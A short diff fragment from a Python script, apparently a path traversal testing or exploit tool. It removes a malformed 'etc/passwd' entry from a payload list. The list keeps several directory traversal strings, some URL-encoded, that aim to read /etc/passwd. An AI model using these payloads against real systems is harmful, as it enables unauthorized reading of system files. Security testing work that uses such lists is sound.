@@ -38,7 +38,6 @@ def main():
      
 
     payloads = [
-        "etc/passwd"
         "../../../../../../etc/passwd",
         "../../../../../../../..//etc/passwd",
         "..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
